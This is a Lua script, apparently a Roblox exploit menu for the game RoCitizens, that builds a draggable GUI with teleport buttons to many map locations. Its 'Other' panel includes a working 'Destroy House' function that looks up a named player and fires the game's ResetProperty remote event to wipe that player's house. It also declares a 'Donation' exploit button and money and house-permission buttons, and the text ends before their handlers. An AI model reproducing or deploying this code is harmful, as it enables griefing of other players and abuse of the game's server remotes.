-- Objects

local RoCitizensGUI = Instance.new("ScreenGui")
local topframe = Instance.new("Frame")
local mainframe = Instance.new("Frame")
local TeleportsTab = Instance.new("TextButton")
local OtherTab = Instance.new("TextButton")
local Creds = Instance.new("TextLabel")
local Close = Instance.new("TextButton")
local Minimize = Instance.new("TextButton")
local TeleportsFrame = Instance.new("Frame")
local TeleportsScrollingFrame = Instance.new("ScrollingFrame")
local HousePlotsTP = Instance.new("TextButton")
local PoliceStationTP = Instance.new("TextButton")
local SchoolTP = Instance.new("TextButton")
local StadiumTP = Instance.new("TextButton")
local HospitalTP = Instance.new("TextButton")
local GymTP = Instance.new("TextButton")
local LibraryTP = Instance.new("TextButton")
local GalleryTP = Instance.new("TextButton")
local SupermartTP = Instance.new("TextButton")
local ClubTP = Instance.new("TextButton")
local VIPTP = Instance.new("TextButton")
local GarageTP = Instance.new("TextButton")
local PaghettisTP = Instance.new("TextButton")
local SpawnTP = Instance.new("TextButton")
local DealershipTP = Instance.new("TextButton")
local GasStationTP = Instance.new("TextButton")
local NomburgerTP = Instance.new("TextButton")
local TheaterTP = Instance.new("TextButton")
local ParkingGarageTP = Instance.new("TextButton")
local ApartmentsTP = Instance.new("TextButton")
local ApartmentsTopTP = Instance.new("TextButton")
local LaVeteTP = Instance.new("TextButton")
local BailleysTP = Instance.new("TextButton")
local PoolsTP = Instance.new("TextButton")
local BankTP = Instance.new("TextButton")
local VaultTP = Instance.new("TextButton")
local LabTP = Instance.new("TextButton")
local CampTP = Instance.new("TextButton")
local OtherFrame = Instance.new("Frame")
local PlayerNameBox = Instance.new("TextBox")
local DestroyHouse = Instance.new("TextButton")
local DonationExploit = Instance.new("TextButton")
local CopyHouse = Instance.new("TextButton")
local OpenDoors = Instance.new("TextButton")
local FlipSwitches = Instance.new("TextButton")
local HousePerms = Instance.new("TextButton")
local Goto = Instance.new("TextButton")
local MoneyGiver = Instance.new("TextButton")
local DonationHelp = Instance.new("TextButton")
local HelpFrame = Instance.new("Frame")
local RequiresPlrname = Instance.new("TextLabel")
local MoneyExplain = Instance.new("TextLabel")

-- Properties

RoCitizensGUI.Name = "RoCitizens GUI"
RoCitizensGUI.Parent = game.CoreGui

topframe.Name = "topframe"
topframe.Parent = RoCitizensGUI
topframe.BackgroundColor3 = Color3.new(0, 0, 0)
topframe.BorderColor3 = Color3.new(0, 0, 0)
topframe.Position = UDim2.new(0.156982228, 0, 0.25, 0)
topframe.Size = UDim2.new(0, 129, 0, 12)
topframe.Active = true
topframe.Draggable = true

mainframe.Name = "mainframe"
mainframe.Parent = topframe
mainframe.BackgroundColor3 = Color3.new(0.639216, 0.639216, 0.639216)
mainframe.BorderColor3 = Color3.new(0, 0, 0)
mainframe.Position = UDim2.new(0, 0, 1, 0)
mainframe.Size = UDim2.new(0, 129, 0, 61)

TeleportsTab.Name = "TeleportsTab"
TeleportsTab.Parent = mainframe
TeleportsTab.BackgroundColor3 = Color3.new(0.576471, 0.576471, 0.576471)
TeleportsTab.BorderColor3 = Color3.new(0, 0, 0)
TeleportsTab.Position = UDim2.new(0.0697674453, 0, 0.0740740746, 0)
TeleportsTab.Size = UDim2.new(0, 109, 0, 18)
TeleportsTab.Font = Enum.Font.SourceSans
TeleportsTab.Text = "Teleports"
TeleportsTab.TextColor3 = Color3.new(0, 0, 0)
TeleportsTab.TextSize = 14
TeleportsTab.MouseButton1Click:Connect(function()

    if TeleportsFrame.Visible == false then
        TeleportsFrame.Visible = true
    else
        TeleportsFrame.Visible = false
    end

end)

OtherTab.Name = "OtherTab"
OtherTab.Parent = mainframe
OtherTab.BackgroundColor3 = Color3.new(0.576471, 0.576471, 0.576471)
OtherTab.BorderColor3 = Color3.new(0, 0, 0)
OtherTab.Position = UDim2.new(0.0775193721, 0, 0.609390855, 0)
OtherTab.Size = UDim2.new(0, 108, 0, 18)
OtherTab.Font = Enum.Font.SourceSans
OtherTab.Text = "Other"
OtherTab.TextColor3 = Color3.new(0, 0, 0)
OtherTab.TextSize = 14
OtherTab.MouseButton1Click:Connect(function()

    if OtherFrame.Visible == false then
        OtherFrame.Visible = true
    else
        OtherFrame.Visible = false
    end

end)

Creds.Name = "Creds"
Creds.Parent = topframe
Creds.BackgroundColor3 = Color3.new(0, 0, 0)
Creds.BorderColor3 = Color3.new(0, 0, 0)
Creds.BorderSizePixel = 0
Creds.Position = UDim2.new(0.0697674453, 0, 0, 0)
Creds.Size = UDim2.new(0, 63, 0, 7)
Creds.Font = Enum.Font.SourceSans
Creds.Text = "Psykek#3180"
Creds.TextColor3 = Color3.new(1, 0.584314, 0)
Creds.TextSize = 14

Close.Name = "Close"
Close.Parent = topframe
Close.BackgroundColor3 = Color3.new(0, 0, 0)
Close.BorderColor3 = Color3.new(0, 0, 0)
Close.Position = UDim2.new(0.914728701, 0, 0, 0)
Close.Size = UDim2.new(0, 11, 0, 9)
Close.Font = Enum.Font.SourceSans
Close.Text = "X"
Close.TextColor3 = Color3.new(1, 1, 1)
Close.TextSize = 14
Close.MouseButton1Click:Connect(function()

    if topframe.Visible == false then
        topframe.Visible = false
    else
        topframe.Visible = false
    end

end)

Close.MouseButton1Click:Connect(function()

    if HelpFrame.Visible == false then
        HelpFrame.Visible = false
    else
        HelpFrame.Visible = false
    end

end)

Close.MouseButton1Click:Connect(function()

    if OtherFrame.Visible == false then
        OtherFrame.Visible = false
    else
        OtherFrame.Visible = false
    end

end)

Close.MouseButton1Click:Connect(function()

    if TeleportsFrame.Visible == false then
        TeleportsFrame.Visible = false
    else
        TeleportsFrame.Visible = false
    end

end)

Minimize.Name = "Minimize"
Minimize.Parent = topframe
Minimize.BackgroundColor3 = Color3.new(0, 0, 0)
Minimize.BorderColor3 = Color3.new(0, 0, 0)
Minimize.Position = UDim2.new(0.829457402, 0, 0, 0)
Minimize.Size = UDim2.new(0, 11, 0, 9)
Minimize.Font = Enum.Font.SourceSans
Minimize.Text = "-"
Minimize.TextColor3 = Color3.new(1, 1, 1)
Minimize.TextSize = 14
Minimize.MouseButton1Click:Connect(function()

    if mainframe.Visible == false then
        mainframe.Visible = true
    else
        mainframe.Visible = false
    end

end)

Minimize.MouseButton1Click:Connect(function()

    if HelpFrame.Visible == false then
        HelpFrame.Visible = false
    else
        HelpFrame.Visible = false
    end

end)

Minimize.MouseButton1Click:Connect(function()

    if OtherFrame.Visible == false then
        OtherFrame.Visible = false
    else
        OtherFrame.Visible = false
    end

end)

Minimize.MouseButton1Click:Connect(function()

    if TeleportsFrame.Visible == false then
        TeleportsFrame.Visible = false
    else
        TeleportsFrame.Visible = false
    end

end)

TeleportsFrame.Name = "TeleportsFrame"
TeleportsFrame.Parent = RoCitizensGUI
TeleportsFrame.BackgroundColor3 = Color3.new(0.368627, 0.368627, 0.368627)
TeleportsFrame.BorderColor3 = Color3.new(0, 0, 0)
TeleportsFrame.Position = UDim2.new(7.4505806e-09, 0, 0.272286832, 0)
TeleportsFrame.Size = UDim2.new(0, 112, 0, 235)
TeleportsFrame.Active = true
TeleportsFrame.Draggable = true
TeleportsFrame.Visible = false

TeleportsScrollingFrame.Name = "TeleportsScrollingFrame"
TeleportsScrollingFrame.Parent = TeleportsFrame
TeleportsScrollingFrame.BackgroundColor3 = Color3.new(0.545098, 0.545098, 0.545098)
TeleportsScrollingFrame.Position = UDim2.new(0.0535714291, 0, 0.029787235, 0)
TeleportsScrollingFrame.Size = UDim2.new(0, 100, 0, 221)
TeleportsScrollingFrame.ScrollBarThickness = 1

HousePlotsTP.Name = "HousePlotsTP"
HousePlotsTP.Parent = TeleportsScrollingFrame
HousePlotsTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
HousePlotsTP.BorderColor3 = Color3.new(0, 0, 0)
HousePlotsTP.Position = UDim2.new(0.0549999997, 0, 0.0127931777, 0)
HousePlotsTP.Size = UDim2.new(0, 89, 0, 15)
HousePlotsTP.Font = Enum.Font.SourceSans
HousePlotsTP.Text = "House Plots"
HousePlotsTP.TextColor3 = Color3.new(0, 0, 0)
HousePlotsTP.TextSize = 14
HousePlotsTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-14.5373059, 40.2000008, -246.619598))
end)

PoliceStationTP.Name = "PoliceStationTP"
PoliceStationTP.Parent = TeleportsScrollingFrame
PoliceStationTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
PoliceStationTP.BorderColor3 = Color3.new(0, 0, 0)
PoliceStationTP.Position = UDim2.new(0.0600000024, 0, 0.0447761193, 0)
PoliceStationTP.Size = UDim2.new(0, 89, 0, 15)
PoliceStationTP.Font = Enum.Font.SourceSans
PoliceStationTP.Text = "Police Station"
PoliceStationTP.TextColor3 = Color3.new(0, 0, 0)
PoliceStationTP.TextSize = 14
PoliceStationTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-42.606823, 43.0001106, 537.740173))
end)

SchoolTP.Name = "SchoolTP"
SchoolTP.Parent = TeleportsScrollingFrame
SchoolTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
SchoolTP.BorderColor3 = Color3.new(0, 0, 0)
SchoolTP.Position = UDim2.new(0.0550000034, 0, 0.0767590627, 0)
SchoolTP.Size = UDim2.new(0, 89, 0, 15)
SchoolTP.Font = Enum.Font.SourceSans
SchoolTP.Text = "School"
SchoolTP.TextColor3 = Color3.new(0, 0, 0)
SchoolTP.TextSize = 14
SchoolTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-105.917046, 40.6005478, 845.568176))
end)

StadiumTP.Name = "StadiumTP"
StadiumTP.Parent = TeleportsScrollingFrame
StadiumTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
StadiumTP.BorderColor3 = Color3.new(0, 0, 0)
StadiumTP.Position = UDim2.new(0.0550000034, 0, 0.108742006, 0)
StadiumTP.Size = UDim2.new(0, 89, 0, 15)
StadiumTP.Font = Enum.Font.SourceSans
StadiumTP.Text = "Stadium"
StadiumTP.TextColor3 = Color3.new(0, 0, 0)
StadiumTP.TextSize = 14
StadiumTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-406.019836, 49.2000275, 879.79071))
end)

HospitalTP.Name = "HospitalTP"
HospitalTP.Parent = TeleportsScrollingFrame
HospitalTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
HospitalTP.BorderColor3 = Color3.new(0, 0, 0)
HospitalTP.Position = UDim2.new(0.0600000024, 0, 0.140724957, 0)
HospitalTP.Size = UDim2.new(0, 89, 0, 15)
HospitalTP.Font = Enum.Font.SourceSans
HospitalTP.Text = "Hospital"
HospitalTP.TextColor3 = Color3.new(0, 0, 0)
HospitalTP.TextSize = 14
HospitalTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(270.253082, 40.6000061, 1525.95459))
end)

GymTP.Name = "GymTP"
GymTP.Parent = TeleportsScrollingFrame
GymTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
GymTP.BorderColor3 = Color3.new(0, 0, 0)
GymTP.Position = UDim2.new(0.0600000024, 0, 0.1727079, 0)
GymTP.Size = UDim2.new(0, 89, 0, 15)
GymTP.Font = Enum.Font.SourceSans
GymTP.Text = "Gym"
GymTP.TextColor3 = Color3.new(0, 0, 0)
GymTP.TextSize = 14
GymTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(183.725479, 40.6000061, 1099.5697))
end)

LibraryTP.Name = "LibraryTP"
LibraryTP.Parent = TeleportsScrollingFrame
LibraryTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
LibraryTP.BorderColor3 = Color3.new(0, 0, 0)
LibraryTP.Position = UDim2.new(0.0550000034, 0, 0.204690844, 0)
LibraryTP.Size = UDim2.new(0, 89, 0, 15)
LibraryTP.Font = Enum.Font.SourceSans
LibraryTP.Text = "Library"
LibraryTP.TextColor3 = Color3.new(0, 0, 0)
LibraryTP.TextSize = 14
LibraryTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(372.42691, 44.5990105, 1121.01062))
end)

GalleryTP.Name = "GalleryTP"
GalleryTP.Parent = TeleportsScrollingFrame
GalleryTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
GalleryTP.BorderColor3 = Color3.new(0, 0, 0)
GalleryTP.Position = UDim2.new(0.0599999987, 0, 0.236673787, 0)
GalleryTP.Size = UDim2.new(0, 89, 0, 15)
GalleryTP.Font = Enum.Font.SourceSans
GalleryTP.Text = "Gallery"
GalleryTP.TextColor3 = Color3.new(0, 0, 0)
GalleryTP.TextSize = 14
GalleryTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(626.764709, 45.1999969, 1540.44666))
end)

SupermartTP.Name = "SupermartTP"
SupermartTP.Parent = TeleportsScrollingFrame
SupermartTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
SupermartTP.BorderColor3 = Color3.new(0, 0, 0)
SupermartTP.Position = UDim2.new(0.0599999987, 0, 0.268656731, 0)
SupermartTP.Size = UDim2.new(0, 89, 0, 15)
SupermartTP.Font = Enum.Font.SourceSans
SupermartTP.Text = "Super Mart"
SupermartTP.TextColor3 = Color3.new(0, 0, 0)
SupermartTP.TextSize = 14
SupermartTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(316.802734, 40.5985069, 928.355103))
end)

ClubTP.Name = "ClubTP"
ClubTP.Parent = TeleportsScrollingFrame
ClubTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
ClubTP.BorderColor3 = Color3.new(0, 0, 0)
ClubTP.Position = UDim2.new(0.0599999987, 0, 0.300639689, 0)
ClubTP.Size = UDim2.new(0, 89, 0, 15)
ClubTP.Font = Enum.Font.SourceSans
ClubTP.Text = "Club"
ClubTP.TextColor3 = Color3.new(0, 0, 0)
ClubTP.TextSize = 14
ClubTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(577.47821, 36.1989594, 881.908081))
end)

VIPTP.Name = "VIPTP"
VIPTP.Parent = TeleportsScrollingFrame
VIPTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
VIPTP.BorderColor3 = Color3.new(0, 0, 0)
VIPTP.Position = UDim2.new(0.0549999997, 0, 0.332622647, 0)
VIPTP.Size = UDim2.new(0, 89, 0, 15)
VIPTP.Font = Enum.Font.SourceSans
VIPTP.Text = "VIP"
VIPTP.TextColor3 = Color3.new(0, 0, 0)
VIPTP.TextSize = 14
VIPTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(523.23291, 53.8004646, 928.198792))
end)

GarageTP.Name = "GarageTP"
GarageTP.Parent = TeleportsScrollingFrame
GarageTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
GarageTP.BorderColor3 = Color3.new(0, 0, 0)
GarageTP.Position = UDim2.new(0.0600000024, 0, 0.364605606, 0)
GarageTP.Size = UDim2.new(0, 89, 0, 15)
GarageTP.Font = Enum.Font.SourceSans
GarageTP.Text = "Garage"
GarageTP.TextColor3 = Color3.new(0, 0, 0)
GarageTP.TextSize = 14
GarageTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(662.628479, 40.2006035, 887.454773))
end)

PaghettisTP.Name = "Paghetti'sTP"
PaghettisTP.Parent = TeleportsScrollingFrame
PaghettisTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
PaghettisTP.BorderColor3 = Color3.new(0, 0, 0)
PaghettisTP.Position = UDim2.new(0.0550000034, 0, 0.396588564, 0)
PaghettisTP.Size = UDim2.new(0, 89, 0, 15)
PaghettisTP.Font = Enum.Font.SourceSans
PaghettisTP.Text = "Paghetti's"
PaghettisTP.TextColor3 = Color3.new(0, 0, 0)
PaghettisTP.TextSize = 14
PaghettisTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(716.264587, 40.6000061, 766.043396))
end)

SpawnTP.Name = "SpawnTP"
SpawnTP.Parent = TeleportsScrollingFrame
SpawnTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
SpawnTP.BorderColor3 = Color3.new(0, 0, 0)
SpawnTP.Position = UDim2.new(0.0550000034, 0, 0.428571522, 0)
SpawnTP.Size = UDim2.new(0, 89, 0, 15)
SpawnTP.Font = Enum.Font.SourceSans
SpawnTP.Text = "Spawn"
SpawnTP.TextColor3 = Color3.new(0, 0, 0)
SpawnTP.TextSize = 14
SpawnTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(522.743713, 40.6000061, 627.02002))
end)

DealershipTP.Name = "DealershipTP"
DealershipTP.Parent = TeleportsScrollingFrame
DealershipTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
DealershipTP.BorderColor3 = Color3.new(0, 0, 0)
DealershipTP.Position = UDim2.new(0.0550000034, 0, 0.460554481, 0)
DealershipTP.Size = UDim2.new(0, 89, 0, 15)
DealershipTP.Font = Enum.Font.SourceSans
DealershipTP.Text = "Dealership"
DealershipTP.TextColor3 = Color3.new(0, 0, 0)
DealershipTP.TextSize = 14
DealershipTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(323.157349, 40.199276, 607.043518))
end)

GasStationTP.Name = "GasStationTP"
GasStationTP.Parent = TeleportsScrollingFrame
GasStationTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
GasStationTP.BorderColor3 = Color3.new(0, 0, 0)
GasStationTP.Position = UDim2.new(0.0600000024, 0, 0.492537409, 0)
GasStationTP.Size = UDim2.new(0, 89, 0, 15)
GasStationTP.Font = Enum.Font.SourceSans
GasStationTP.Text = "Gas Station"
GasStationTP.TextColor3 = Color3.new(0, 0, 0)
GasStationTP.TextSize = 14
GasStationTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(318.57431, 40.8002701, 464.054932))
end)

NomburgerTP.Name = "NomburgerTP"
NomburgerTP.Parent = TeleportsScrollingFrame
NomburgerTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
NomburgerTP.BorderColor3 = Color3.new(0, 0, 0)
NomburgerTP.Position = UDim2.new(0.0600000024, 0, 0.524520338, 0)
NomburgerTP.Size = UDim2.new(0, 89, 0, 15)
NomburgerTP.Font = Enum.Font.SourceSans
NomburgerTP.Text = "Nomburger"
NomburgerTP.TextColor3 = Color3.new(0, 0, 0)
NomburgerTP.TextSize = 14
NomburgerTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(406.012878, 40.6000061, 300.434174))
end)

TheaterTP.Name = "TheaterTP"
TheaterTP.Parent = TeleportsScrollingFrame
TheaterTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
TheaterTP.BorderColor3 = Color3.new(0, 0, 0)
TheaterTP.Position = UDim2.new(0.0600000024, 0, 0.556503296, 0)
TheaterTP.Size = UDim2.new(0, 89, 0, 15)
TheaterTP.Font = Enum.Font.SourceSans
TheaterTP.Text = "Theater"
TheaterTP.TextColor3 = Color3.new(0, 0, 0)
TheaterTP.TextSize = 14
TheaterTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(691.900208, 40.6000061, 481.815674))
end)

ParkingGarageTP.Name = "ParkingGarageTP"
ParkingGarageTP.Parent = TeleportsScrollingFrame
ParkingGarageTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
ParkingGarageTP.BorderColor3 = Color3.new(0, 0, 0)
ParkingGarageTP.Position = UDim2.new(0.0600000024, 0, 0.588486254, 0)
ParkingGarageTP.Size = UDim2.new(0, 89, 0, 15)
ParkingGarageTP.Font = Enum.Font.SourceSans
ParkingGarageTP.Text = "Parking Garage"
ParkingGarageTP.TextColor3 = Color3.new(0, 0, 0)
ParkingGarageTP.TextSize = 14
ParkingGarageTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(683.101563, 40.1999016, 208.719376))
end)

ApartmentsTP.Name = "ApartmentsTP"
ApartmentsTP.Parent = TeleportsScrollingFrame
ApartmentsTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
ApartmentsTP.BorderColor3 = Color3.new(0, 0, 0)
ApartmentsTP.Position = UDim2.new(0.0600000024, 0, 0.620469213, 0)
ApartmentsTP.Size = UDim2.new(0, 89, 0, 15)
ApartmentsTP.Font = Enum.Font.SourceSans
ApartmentsTP.Text = "Apartments"
ApartmentsTP.TextColor3 = Color3.new(0, 0, 0)
ApartmentsTP.TextSize = 14
ApartmentsTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(511.04657, 40.6000023, 177.261658))
end)

ApartmentsTopTP.Name = "ApartmentsTopTP"
ApartmentsTopTP.Parent = TeleportsScrollingFrame
ApartmentsTopTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
ApartmentsTopTP.BorderColor3 = Color3.new(0, 0, 0)
ApartmentsTopTP.Position = UDim2.new(0.0600000024, 0, 0.652452171, 0)
ApartmentsTopTP.Size = UDim2.new(0, 89, 0, 15)
ApartmentsTopTP.Font = Enum.Font.SourceSans
ApartmentsTopTP.Text = "Apartments Top"
ApartmentsTopTP.TextColor3 = Color3.new(0, 0, 0)
ApartmentsTopTP.TextSize = 14
ApartmentsTopTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(504.965454, 112.600037, 179.609741))
end)

LaVeteTP.Name = "LaVeteTP"
LaVeteTP.Parent = TeleportsScrollingFrame
LaVeteTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
LaVeteTP.BorderColor3 = Color3.new(0, 0, 0)
LaVeteTP.Position = UDim2.new(0.0600000024, 0, 0.684435129, 0)
LaVeteTP.Size = UDim2.new(0, 89, 0, 15)
LaVeteTP.Font = Enum.Font.SourceSans
LaVeteTP.Text = "La Vete"
LaVeteTP.TextColor3 = Color3.new(0, 0, 0)
LaVeteTP.TextSize = 14
LaVeteTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(490.219757, 40.6000023, 35.6828461))
end)

BailleysTP.Name = "BailleysTP"
BailleysTP.Parent = TeleportsScrollingFrame
BailleysTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
BailleysTP.BorderColor3 = Color3.new(0, 0, 0)
BailleysTP.Position = UDim2.new(0.0600000024, 0, 0.716418087, 0)
BailleysTP.Size = UDim2.new(0, 89, 0, 15)
BailleysTP.Font = Enum.Font.SourceSans
BailleysTP.Text = "Bailley's"
BailleysTP.TextColor3 = Color3.new(0, 0, 0)
BailleysTP.TextSize = 14
BailleysTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(388.630615, 40.6000061, 66.4509811))
end)

PoolsTP.Name = "PoolsTP"
PoolsTP.Parent = TeleportsScrollingFrame
PoolsTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
PoolsTP.BorderColor3 = Color3.new(0, 0, 0)
PoolsTP.Position = UDim2.new(0.0600000024, 0, 0.748400986, 0)
PoolsTP.Size = UDim2.new(0, 89, 0, 15)
PoolsTP.Font = Enum.Font.SourceSans
PoolsTP.Text = "Pools"
PoolsTP.TextColor3 = Color3.new(0, 0, 0)
PoolsTP.TextSize = 14
PoolsTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(184.809845, 40.600708, 599.746095))
end)

BankTP.Name = "BankTP"
BankTP.Parent = TeleportsScrollingFrame
BankTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
BankTP.BorderColor3 = Color3.new(0, 0, 0)
BankTP.Position = UDim2.new(0.0600000024, 0, 0.780383885, 0)
BankTP.Size = UDim2.new(0, 89, 0, 15)
BankTP.Font = Enum.Font.SourceSans
BankTP.Text = "Bank"
BankTP.TextColor3 = Color3.new(0, 0, 0)
BankTP.TextSize = 14
BankTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-149.842178, 40.6000061, 1373.71753))
end)

VaultTP.Name = "VaultTP"
VaultTP.Parent = TeleportsScrollingFrame
VaultTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
VaultTP.BorderColor3 = Color3.new(0, 0, 0)
VaultTP.Position = UDim2.new(0.0600000024, 0, 0.812366843, 0)
VaultTP.Size = UDim2.new(0, 89, 0, 15)
VaultTP.Font = Enum.Font.SourceSans
VaultTP.Text = "Vault"
VaultTP.TextColor3 = Color3.new(0, 0, 0)
VaultTP.TextSize = 14
VaultTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-217.464645, 43, 1485.65125))
end)

LabTP.Name = "LabTP"
LabTP.Parent = TeleportsScrollingFrame
LabTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
LabTP.BorderColor3 = Color3.new(0, 0, 0)
LabTP.Position = UDim2.new(0.0600000024, 0, 0.844349802, 0)
LabTP.Size = UDim2.new(0, 89, 0, 15)
LabTP.Font = Enum.Font.SourceSans
LabTP.Text = "Lab"
LabTP.TextColor3 = Color3.new(0, 0, 0)
LabTP.TextSize = 14
LabTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(164.821335, 4.40000153, 59.6830521))
end)

CampTP.Name = "CampTP"
CampTP.Parent = TeleportsScrollingFrame
CampTP.BackgroundColor3 = Color3.new(0.513726, 0.513726, 0.513726)
CampTP.BorderColor3 = Color3.new(0, 0, 0)
CampTP.Position = UDim2.new(0.0600000024, 0, 0.87633276, 0)
CampTP.Size = UDim2.new(0, 89, 0, 15)
CampTP.Font = Enum.Font.SourceSans
CampTP.Text = "Camp"
CampTP.TextColor3 = Color3.new(0, 0, 0)
CampTP.TextSize = 14
CampTP.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character:MoveTo(Vector3.new(684.505554, 39.8000031, -334.9245))
end)

OtherFrame.Name = "OtherFrame"
OtherFrame.Parent = RoCitizensGUI
OtherFrame.BackgroundColor3 = Color3.new(0.368627, 0.368627, 0.368627)
OtherFrame.BorderColor3 = Color3.new(0, 0, 0)
OtherFrame.Position = UDim2.new(0.576382399, 0, 0.401162803, 0)
OtherFrame.Size = UDim2.new(0, 170, 0, 137)
OtherFrame.Active = true
OtherFrame.Draggable = true
OtherFrame.Visible= false

PlayerNameBox.Name = "PlayerNameBox"
PlayerNameBox.Parent = OtherFrame
PlayerNameBox.BackgroundColor3 = Color3.new(0.639216, 0.639216, 0.639216)
PlayerNameBox.BorderColor3 = Color3.new(0, 0, 0)
PlayerNameBox.Position = UDim2.new(0.0500000007, 0, 0.0583941601, 0)
PlayerNameBox.Size = UDim2.new(0, 153, 0, 17)
PlayerNameBox.Font = Enum.Font.SourceSans
PlayerNameBox.Text = "Player Name Here"
PlayerNameBox.TextColor3 = Color3.new(0, 0, 0)
PlayerNameBox.TextSize = 14

DestroyHouse.Name = "DestroyHouse"
DestroyHouse.Parent = OtherFrame
DestroyHouse.BackgroundColor3 = Color3.new(0.494118, 0.494118, 0.494118)
DestroyHouse.BorderColor3 = Color3.new(0, 0, 0)
DestroyHouse.Position = UDim2.new(0.052941177, 0, 0.23357664, 0)
DestroyHouse.Size = UDim2.new(0, 67, 0, 17)
DestroyHouse.Font = Enum.Font.SourceSans
DestroyHouse.Text = "Destroy House"
DestroyHouse.TextColor3 = Color3.new(0, 0, 0)
DestroyHouse.TextSize = 12
DestroyHouse.TextWrapped = true
DestroyHouse.MouseButton1Click:Connect(function()
	local Target = (PlayerNameBox.Text)
local Plrs = game:GetService("Players")
local MyPlr = Plrs.LocalPlayer

function FindPlayer(Str, Hint)
	local Plr = { }
	for _, v in pairs(Plrs:GetPlayers()) do
		if string.lower(string.sub(v.Name, 1, string.len(Str))) == string.lower(Str) then
			table.insert(Plr, v)
		end
	end
	if #Plr == 1 then
		return Plr[1]
	else
		Hint.Text = "PLAYER NOT FOUND. CHECK YOUR SPELLING YOU IDIOT."
		wait(5)
		Hint:Destroy()
		error("lalalalalalalalalalaalalalaalalallalalalallalalallalalalallalalalall")
	end
end

function FindHouse(Plr)
	local Properties = { }
	for _, v in next, workspace:GetChildren() do
		if v:IsA("Model") and v.Name == "Property" then
			table.insert(Properties, v:GetChildren())
		end
	end
	for _, v in next, Properties do
		local Find = v[1]:FindFirstChild("Owner")
		if Find then
			if Find.Value == Plr.Name then
				return v[1]
			end
		end
	end

	return nil
end

function DestroyHouse(Str)
	local Plr = FindPlayer(Str)
	if Plr then
		local GetHouse = FindHouse(Plr)
		if GetHouse then
			workspace.CommunicationRelays.House.ResetProperty:FireServer(GetHouse)
		end
	end
end

DestroyHouse(Target)
end)

DonationExploit.Name = "DonationExploit"
DonationExploit.Parent = OtherFrame
DonationExploit.BackgroundColor3 = Color3.new(0.494118, 0.494118, 0.494118)
DonationExploit.BorderColor3 = Color3.new(0, 0, 0)
DonationExploit.Position = UDim2.new(0.558823586, 0, 0.23357664, 0)
DonationExploit.Size = UDim2.new(0, 67, 0, 17)
DonationExploit.Font = Enum.Font.SourceSans
DonationExploit.Text = "Donation"
DonationExploit.TextColor3 = Color3.new(0, 0, 0)
DonationExploit.TextSize = 14
